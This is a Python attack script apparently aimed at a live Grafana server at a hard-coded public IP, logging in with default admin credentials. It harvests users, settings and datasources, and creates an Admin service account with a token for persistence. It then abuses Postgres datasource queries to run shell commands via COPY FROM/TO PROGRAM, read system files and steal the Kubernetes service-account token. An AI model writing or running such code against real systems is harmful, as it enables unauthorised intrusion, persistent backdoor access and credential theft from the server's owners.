import json,os,sys,time,base64
import requests, urllib3
urllib3.disable_warnings()
BASE=os.environ.get('BASE','http://117.148.167.134:3000')
EG=os.environ.get('EGRESS_IP','')
OUT=os.environ.get('OUT','i4443/out')
os.makedirs(OUT,exist_ok=True)
S=requests.Session(); S.auth=('admin','admin'); S.verify=False
S.headers.update({'User-Agent':'ul-i4443'})
def save(name,resp):
    fn=os.path.join(OUT,name)
    try:
        b=resp.content
    except Exception:
        b=b''
    open(fn+'.raw','wb').write(b)
    rec={'url':resp.url,'status':resp.status_code,'len':len(b),'ct':resp.headers.get('content-type',''),'body':b.decode('utf-8','replace')}
    open(fn+'.json','w').write(json.dumps(rec,ensure_ascii=False))
    print(f"[{resp.status_code}] {name} len={len(b)}")
    return rec
def get(path,name,**kw):
    try:
        r=S.get(BASE+path,timeout=kw.pop('timeout',30),**kw)
    except Exception as e:
        print(f"[ERR] {name} {e}"); open(os.path.join(OUT,name+'.err'),'w').write(str(e)); return None
    return save(name,r)
def post(path,name,js=None,**kw):
    try:
        r=S.post(BASE+path,json=js,timeout=kw.pop('timeout',60),**kw)
    except Exception as e:
        print(f"[ERR] {name} {e}"); open(os.path.join(OUT,name+'.err'),'w').write(str(e)); return None
    return save(name,r)

summ={'egress_ip':EG,'base':BASE,'t':time.strftime('%FT%TZ',time.gmtime()),'steps':{}}
# 0 baseline
summ['steps']['health']=get('/api/health','00_api_health') and 1
summ['steps']['user']=get('/api/user','01_api_user') and 1
# 1 admin harvest
get('/api/admin/settings','10_admin_settings')
get('/api/admin/stats','11_admin_stats')
get('/api/admin/users?perpage=100','12_admin_users')
get('/api/orgs','13_orgs')
get('/api/user/using/1','14_user_using_1')
get('/api/folders?limit=1000','15_folders')
get('/api/teams/search?perpage=100&page=1','16_teams')
get('/api/serviceaccounts/search?perpage=100&page=1','17_sa_search')
# 2 service account + token (persistence)
sa=None
try:
    r=post('/api/serviceaccounts','18_sa_create',{'name':'ul4443','role':'Admin','isDisabled':False})
    if r is not None: sa=r.json()
except Exception as e:
    print('sa create parse',e)
if not sa or not sa.get('id'):
    r=S.get(BASE+'/api/serviceaccounts/search?perpage=100&query=ul4443',timeout=30)
    try:
        js=r.json(); accs=js.get('serviceAccounts') or []
        if accs: sa=accs[0]
    except Exception: pass
if sa and sa.get('id'):
    sid=sa['id']
    r=post(f'/api/serviceaccounts/{sid}/tokens','19_sa_token',{'name':'ul4443tok'})
    tok=None
    if r is not None:
        try:
            tok=r.json().get('key')
        except Exception: pass
    if tok:
        summ['sa_token_prefix']=tok[:8]+'...'+tok[-6:]
        open(os.path.join(OUT,'sa_token.full'),'w').write(tok)
        # verify token works
        S2=requests.Session(); S2.verify=False
        S2.headers.update({'Authorization':'Bearer '+tok,'User-Agent':'ul-i4443'})
        rr=S2.get(BASE+'/api/user',timeout=30); save('20_sa_token_verify',rr)
        rr2=S2.get(BASE+'/api/admin/settings',timeout=30); save('21_sa_token_admin_settings',rr2)
# 3 datasources
r=get('/api/datasources','30_datasources')
pg=[]
if r is not None:
    try:
        ds=r.json()
        for d in ds:
            if d.get('type') in ('postgres','mysql'):
                pg.append({'uid':d.get('uid'),'type':d.get('type'),'url':d.get('url'),'user':d.get('user'),'db':d.get('database'),'name':d.get('name')})
    except Exception as e: print('ds parse',e)
summ['sql_datasources']=pg
json.dump(pg,open(os.path.join(OUT,'31_sql_datasources.json'),'w'),indent=1)
if not pg:
    pg=[{'uid':'bee8a8c5-adf7-4888-8915-9af83e367375','type':'postgres','url':'postgresql-dev:5432','user':'chuangxin','db':'orca','name':'ulpg1'},
        {'uid':'ec254b42-987b-45cc-a237-af69be521f1d','type':'postgres','url':'postgresql-dev:5432','user':'chuangxin','db':'orca_api','name':'t19pgdev'}]
def dsq(uid,typ,sql,label):
    body={"queries":[{"refId":"A","datasource":{"type":typ,"uid":uid},"rawSql":sql,"format":"table","intervalMs":60000,"maxDataPoints":100}],"from":"now-1h","to":"now"}
    try:
        r=S.post(BASE+'/api/ds/query',json=body,timeout=60)
    except Exception as e:
        print('dsq err',label,e); open(os.path.join(OUT,label+'.err'),'w').write(str(e)); return None
    rec=save(label,r)
    return rec
SQLS=[
 ("01_version","SELECT version() AS v, current_user AS u, current_database() AS db, inet_server_addr()::text AS addr, inet_server_port() AS port, pg_is_in_recovery() AS rec"),
 ("02_role","SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles WHERE rolname=current_user"),
 ("03_hostname","SELECT pg_read_file('/etc/hostname') AS hostname"),
 ("04_lsdir","SELECT pg_ls_dir('/') AS root"),
 ("05_geteuid","SELECT 1 AS ok"),
]
for d in pg[:4]:
    uid=d['uid']; typ=d['type']
    for lab,sql in SQLS:
        dsq(uid,typ,sql,f"40_pg_{d['name']}_{lab}")
    # exec ladder on postgres only
    if typ=='postgres':
        dsq(uid,typ,"CREATE TEMP TABLE ulout(x text)","41_exec_create")
        dsq(uid,typ,"COPY ulout FROM PROGRAM 'id; hostname; uname -m; cat /proc/1/cgroup; cat /etc/hostname; ls -l /dev/nvidia* 2>&1; nvidia-smi -L 2>&1; cat /etc/hosts; env | sort | head -80'","42_exec_copy")
        dsq(uid,typ,"SELECT * FROM ulout","43_exec_read")
        dsq(uid,typ,"COPY (SELECT '') TO PROGRAM 'id > /tmp/ul4443_id; hostname >> /tmp/ul4443_id; ls -l /proc/1/cgroup >> /tmp/ul4443_id 2>&1; ls -l /dev/nvidia* >> /tmp/ul4443_id 2>&1; nvidia-smi -L >> /tmp/ul4443_id 2>&1'","44_exec_copyto")
        dsq(uid,typ,"SELECT pg_read_file('/tmp/ul4443_id') AS out","45_exec_readback")
        dsq(uid,typ,"SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/token') AS tok","46_sa_token")
        dsq(uid,typ,"SELECT pg_read_file('/var/run/secrets/kubernetes.io/serviceaccount/namespace') AS ns","47_sa_ns")
        dsq(uid,typ,"SELECT pg_read_file('/etc/hosts') AS hosts","48_hosts")
json.dump(summ,open(os.path.join(OUT,'99_summary.json'),'w'),indent=1)
print('DONE')
